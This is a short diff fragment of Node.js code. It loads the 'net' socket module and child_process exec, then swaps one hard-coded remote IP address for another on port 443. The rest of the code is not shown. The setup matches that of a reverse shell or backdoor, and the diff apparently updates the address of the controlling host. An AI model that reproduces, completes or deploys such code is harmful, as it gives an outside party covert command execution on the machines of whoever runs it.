@@ -2,7 +2,7 @@ const net = require('net');
 const { exec } = require('child_process');
 
 
-const HOST = '54.144.111.154';
+const HOST = '18.209.43.82';
 const PORT = 443;
 
 try{
